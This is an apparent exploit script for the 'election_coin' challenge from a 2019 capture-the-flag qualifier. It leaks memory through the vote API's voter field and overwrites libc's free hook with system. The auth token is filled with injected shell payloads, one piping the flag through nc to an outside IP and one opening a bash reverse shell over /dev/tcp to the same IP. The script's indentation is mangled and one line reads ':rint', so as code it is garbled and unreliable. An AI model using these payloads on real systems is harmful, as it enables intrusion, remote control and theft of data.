import time
import requests
import json
from pwn import *
#token = "pbBVZ2NkAgyQJhk6SCZqDv07UDLmgt_Ex9-s-_75hvI="
token = ";cat flag | nc 54.180.100.218 1337;\x00"
token = ";bash -i >& /dev/tcp/54.180.100.218/1337 0>&1;\x00"
#hi = {'voter':'ABCDABCD','election':1,'votes':1}
host = "192.168.33.10:8888"
#host = "election_coin.quals2019.oooverflow.io:8888"
def leak(addr):
        hi =  {"voter":"bc1%016x"%(addr),"election":"dc2019","votes":{"best_ctf_team":{"candidate":"0e85dc6eaf","currency":"bitcoin","amount":5.0}}}
            r = requests.post('http://%s/api/v1/election/dc2019/vote'%host, headers={"X-Election-Auth": token}, data=json.dumps(hi))
                return r

            def write(addr,value):
                    hi =  {"voter":"DD%016x"%(addr)+" "+"%016x"%(value),"election":"dc2019","votes":{"best_ctf_team":{"candidate":"0e85dc6eaf","currency":"dogecoin","amount":5.0}}}
                        r = requests.post('http://%s/api/v1/election/dc2019/vote'%host, headers={"X-Election-Auth": token}, data=json.dumps(hi))
                            return r
                        #r = leak(0x52B497)
                        r = leak(0x0005CBA30)
                        system = int(r.text.split('(')[1][:12],16)
                        print "system @ 0x%x"%system

                        r = leak(0x05CC460)
                        libc = int(r.text.split('(')[1][:12],16)
                        :rint "LIBC @ 0x%x"%libc
                        free_hook = libc+0x1188
                        write(free_hook, system)
                        '''
                        r= requests.get('http://192.168.33.10:8888/api/v1/exchange/dogecoin/tx_log', headers={"X-Election-Auth": token})
                        '''
                        #r = requests.post('http://election_coin.quals2019.oooverflow.io:8888/api/v1/election/dc2019/vote',headers={"X-Election-Auth": token},data=json.dumps(hi))
